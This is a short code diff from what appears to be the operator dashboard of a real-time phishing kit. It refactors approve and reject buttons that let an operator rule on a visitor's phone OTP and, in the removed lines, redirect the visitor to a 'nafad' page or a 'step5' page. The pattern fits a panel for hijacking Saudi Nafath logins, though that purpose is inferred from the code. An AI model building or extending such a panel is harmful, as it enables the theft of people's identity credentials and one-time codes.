@@ -3709,48 +3709,30 @@ const renderNafadBox = () => {
               {showPhoneDecisionButtons && (
                 <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                   <button onClick={async () => { 
-                    setPhoneLocalDecision("approved");
-                    socketUpdatedBoxRef.current = "phone"; // Mark phone box as updated
                     setActionLoading("phone");
                     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                     if (visitorId) {
-                      await fetch("/api/dashboard/reflect-status", {
+                      await fetch("/api/dashboard/admin-action", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ visitorId, field: "phoneOtpStatus", status: "approved" }),
-                      });
-                      await fetch("/api/dashboard/redirect", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ visitorId, targetPage: "nafad" }),
+                        body: JSON.stringify({ visitorId, boxType: "phone", action: "approve" }),
                       });
                     }
                     setActionLoading(null);
-                    // Clear the marker after a delay
-                    setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                   }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     موافقة
                   </button>
                   <button onClick={async () => { 
-                    setPhoneLocalDecision("rejected");
-                    socketUpdatedBoxRef.current = "phone"; // Mark phone box as updated
                     setActionLoading("phone");
                     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                     if (visitorId) {
-                      await fetch("/api/dashboard/reflect-status", {
+                      await fetch("/api/dashboard/admin-action", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ visitorId, field: "phoneOtpStatus", status: "rejected" }),
-                      });
-                      await fetch("/api/dashboard/redirect", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ visitorId, targetPage: "step5" }),
+                        body: JSON.stringify({ visitorId, boxType: "phone", action: "reject" }),
                       });
                     }
                     setActionLoading(null);
-                    // Clear the marker after a delay
-                    setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                   }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     رفض
                   </button>
